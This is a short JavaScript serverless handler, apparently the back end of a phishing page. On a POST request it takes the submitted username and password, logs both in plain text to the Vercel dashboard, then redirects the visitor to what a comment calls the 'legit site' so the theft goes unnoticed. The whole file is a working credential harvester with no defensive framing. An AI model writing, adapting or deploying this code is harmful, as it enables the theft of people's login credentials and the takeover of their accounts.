export default function handler(req, res) {
  if (req.method === 'POST') {
    const { username, password } = req.body;

    // Log to Vercel Logs (you can see this in the Vercel Dashboard logs)
    console.log("Username:", username);
    console.log("Password:", password);

    // Redirect to legit site
    res.writeHead(302, { Location: "https://devtechfusion.com" });
    res.end();
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
